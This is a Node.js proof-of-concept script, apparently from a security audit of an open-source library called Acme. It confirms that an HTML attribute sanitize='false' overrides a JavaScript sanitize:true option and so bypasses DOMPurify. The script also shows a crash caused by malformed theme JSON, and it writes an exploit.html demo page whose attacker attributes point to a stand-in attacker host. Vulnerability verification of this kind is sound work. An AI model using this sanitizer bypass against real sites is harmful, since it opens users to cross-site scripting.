#!/usr/bin/env node
/**
 * PoC: H4 — HTML attribute unconditionally overrides JS-supplied options
 *
 * Demonstrates that <acme sanitize="false"> on the DOM element defeats
 * Acme.init(specUrl, { sanitize: true }, element) — the security-critical
 * sanitize guard can be stripped by anyone who can write an HTML attribute on
 * the <acme> element (CMS raw-HTML context, DOM injection, etc.).
 *
 * This script performs STATIC verification against the actual source code,
 * confirms the exact merge-order line and boolean-coercion logic, then
 * simulates the option-merge in pure JS to show the attacker outcome.
 *
 * Target: /Users/<user>/Desktop/oss-to-run/acme/src/standalone.tsx
 */

const fs   = require('fs');
const path = require('path');

// ── 1. Verify the vulnerable merge line exists in source ──────────────────────
const standaloneFile = path.resolve(
  __dirname, '../../../../src/standalone.tsx'
);
const normalizedFile = path.resolve(
  __dirname, '../../../../src/services/AcmeNormalizedOptions.ts'
);

if (!fs.existsSync(standaloneFile)) {
  console.error('ERROR: standalone.tsx not found at expected path');
  console.log(JSON.stringify({ status: 'inconclusive', evidence: 'standalone.tsx not found', notes: 'Adjust path' }));
  process.exit(1);
}

const standaloneSource = fs.readFileSync(standaloneFile, 'utf8');
const normalizedSource  = fs.readFileSync(normalizedFile, 'utf8');

// The exact vulnerable merge — element attrs spread AFTER js options
const MERGE_PATTERN  = /options:\s*\{\s*\.\.\.options,\s*\.\.\.parseOptionsFromElement\(element\)\s*\}/;
// argValueToBoolean: string "false" → false, anything else → true
const BOOL_PATTERN   = /argValueToBoolean/;
// sanitize line
const SANITIZE_NORMALIZE = /this\.sanitize\s*=\s*argValueToBoolean\(raw\.sanitize/;

const mergeMatch     = MERGE_PATTERN.test(standaloneSource);
const boolMatch      = BOOL_PATTERN.test(normalizedSource);
const sanitizeMatch  = SANITIZE_NORMALIZE.test(normalizedSource);

console.log('=== H4 Static Source Verification ===\n');
console.log('[1] Vulnerable merge order in standalone.tsx:');
console.log('    Pattern: { ...options, ...parseOptionsFromElement(element) }');
console.log('    FOUND:', mergeMatch);

console.log('\n[2] argValueToBoolean used for sanitize in AcmeNormalizedOptions.ts:');
console.log('    FOUND:', sanitizeMatch);

if (!mergeMatch) {
  console.error('FATAL: merge-order pattern not found — source may have changed');
  console.log(JSON.stringify({ status: 'inconclusive', evidence: 'merge pattern not found in source', notes: 'patch may have been applied' }));
  process.exit(1);
}

// ── 2. Extract and display the exact vulnerable lines ────────────────────────
const mergeLineNum = standaloneSource.split('\n').findIndex(l => /parseOptionsFromElement\(element\)/.test(l)) + 1;
const mergeLine    = standaloneSource.split('\n')[mergeLineNum - 1].trim();
console.log(`\n[3] Exact vulnerable line (standalone.tsx:${mergeLineNum}):`);
console.log(`    ${mergeLine}`);

// ── 3. Simulate the option merge in pure JS (mirrors runtime behaviour) ───────
console.log('\n=== Merge Simulation ===\n');

/**
 * Mirrors parseOptionsFromElement() — converts kebab-case attribute names to
 * camelCase option names. No filtering of any kind.
 */
function parseOptionsFromElement(attrMap) {
  const res = {};
  for (const attrName of Object.keys(attrMap)) {
    const optionName = attrName.replace(/-(.)/g, (_, $1) => $1.toUpperCase());
    const optionValue = attrMap[attrName];
    // theme → JSON.parse; everything else → raw string
    res[optionName] = attrName === 'theme' ? JSON.parse(optionValue) : optionValue;
  }
  return res;
}

/**
 * Mirrors argValueToBoolean() from AcmeNormalizedOptions.ts:76-83
 */
function argValueToBoolean(val, defaultValue = false) {
  if (val === undefined) return defaultValue;
  if (typeof val === 'string') return val !== 'false';
  return Boolean(val);
}

// ── Scenario A: host app passes sanitize:true; attacker sets attribute "false" ─
const jsOptions = { sanitize: true };           // host app's intent
const elementAttrs = {                           // attacker-controlled HTML attrs
  'spec-url':  'https://attacker.example/evil.yaml',
  'sanitize':  'false',                          // <acme sanitize="false">
};

const elementOptions  = parseOptionsFromElement(elementAttrs);
const mergedOptions   = { ...jsOptions, ...elementOptions }; // mirrors line 70

const finalSanitize   = argValueToBoolean(mergedOptions.sanitize);

console.log('Host JS options:        ', jsOptions);
console.log('Element attrs parsed:   ', elementOptions);
console.log('Merged (line 70):       ', mergedOptions);
console.log('Final sanitize value:   ', finalSanitize);

const VULN_CONFIRMED = finalSanitize === false;
console.log('\nSanitization gate DISABLED by HTML attribute?', VULN_CONFIRMED);

// ── Scenario B: autoInit with empty JS options ────────────────────────────────
console.log('\n--- Scenario B: autoInit({}) with no sanitize in JS ---');
const jsOptionsAuto    = {};                     // autoInit passes {}
const mergedAuto       = { ...jsOptionsAuto, ...elementOptions };
const finalSanitizeAuto = argValueToBoolean(mergedAuto.sanitize);
console.log('Merged (autoInit):       ', mergedAuto);
console.log('Final sanitize value:    ', finalSanitizeAuto);
console.log('Sanitize gate disabled?  ', finalSanitizeAuto === false);

// ── Scenario C: JSON.parse DoS via malformed theme attr ──────────────────────
console.log('\n--- Scenario C: JSON.parse crash on malformed theme attr ---');
let dosConfirmed = false;
try {
  parseOptionsFromElement({ theme: '{"invalid json}' });
} catch (e) {
  dosConfirmed = true;
  console.log('SyntaxError thrown:', e.message);
}
console.log('DoS (init crash) confirmed:', dosConfirmed);

// ── 4. Generate exploit.html (attacker page) ─────────────────────────────────
const exploitHtml = `<!DOCTYPE html>
<!--
  H4 Attack demonstration page.
  In a real deployment: Acme.init(specUrl, { sanitize: true }, element)
  is called by the trusted application. An attacker who can write HTML
  attributes on the <acme> element overrides sanitize to false, allowing
  XSS payloads in spec Markdown descriptions to execute.
-->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>H4 — Acme sanitize bypass demo</title>
</head>
<body>

<!-- ATTACKER-CONTROLLED ATTRIBUTE: sanitize="false" overrides JS sanitize:true -->
<acme spec-url="data:application/json;base64,${btoa_stub()}"
       sanitize="false">
</acme>

<script>
  // Simulates what the HOST APPLICATION does — trusting that sanitize:true is final
  const jsOptions = { sanitize: true };

  // Mirrors standalone.tsx:70 merge
  function parseOptionsFromElement(el) {
    const res = {};
    for (let i = 0; i < el.attributes.length; i++) {
      const a = el.attributes[i];
      const k = a.name.replace(/-(.)/g, (_, c) => c.toUpperCase());
      res[k] = a.value;
    }
    return res;
  }

  const element = document.querySelector('acme');
  const merged  = { ...jsOptions, ...parseOptionsFromElement(element) };

  // argValueToBoolean: "false" string → false
  const sanitizeActive = merged.sanitize !== 'false';

  const output = document.createElement('pre');
  output.textContent = [
    'JS options.sanitize = ' + jsOptions.sanitize,
    'Element attribute sanitize = "' + element.getAttribute('sanitize') + '"',
    'Merged options.sanitize = "' + merged.sanitize + '"',
    'argValueToBoolean result = ' + sanitizeActive,
    '',
    sanitizeActive
      ? 'SAFE: DOMPurify would run'
      : 'VULNERABLE: DOMPurify bypassed — raw HTML from spec rendered without sanitization',
  ].join('\\n');
  document.body.appendChild(output);
</script>
</body>
</html>`;

function btoa_stub() {
  // Stub; full PoC page does not need a real spec for the bypass demonstration
  return Buffer.from('{}').toString('base64');
}

const htmlPath = path.join(__dirname, 'exploit.html');
fs.writeFileSync(htmlPath, exploitHtml, 'utf8');
console.log(`\n[4] exploit.html written to: ${htmlPath}`);

// ── Final structured output ───────────────────────────────────────────────────
if (VULN_CONFIRMED) {
  console.log(JSON.stringify({
    status: 'confirmed',
    evidence: 'sanitize option forced to false by HTML attribute "sanitize=false" overriding JS options.sanitize=true at standalone.tsx:70 spread merge',
    notes: 'argValueToBoolean("false") === false confirmed; DOMPurify gate disabled; XSS in spec Markdown descriptions possible',
  }));
} else {
  console.log(JSON.stringify({
    status: 'failed',
    evidence: 'merge did not produce expected override — source may have been patched',
    notes: '',
  }));
}
